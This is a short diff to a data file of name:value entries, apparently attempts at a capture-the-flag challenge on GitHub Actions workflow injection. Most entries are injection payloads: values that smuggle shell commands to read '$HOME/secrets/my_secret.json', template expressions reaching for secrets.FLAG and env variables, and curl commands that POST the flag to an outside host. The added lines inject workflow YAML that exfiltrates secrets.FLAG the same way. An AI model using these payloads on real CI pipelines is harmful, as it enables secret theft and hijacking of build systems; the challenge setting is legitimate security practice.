@@ -10923,3 +10923,7 @@ CUHKJason:";cat $HOME/secrets/my_secret.json# ; cat $HOME/secrets/my_secret.json
 CUHKJason:$issues
 Zero-00000:${{ secret.FLAG }} ${{ secret.flag }} ${{ secret[FLAG] }} ${{ env.flag }} ${{ env[FLAG] }} ${{ env.FLAG }} "; echo $flag"
 asjdf:';curl -X POST -d "$flag" https://www.homeboyc.cn;echo '1:
+asjdf:"
+          flag: "${{ secrets.FLAG }}"
+        run: |
+          curl -X POST -d "$flag" https://www.homeboyc.cn/
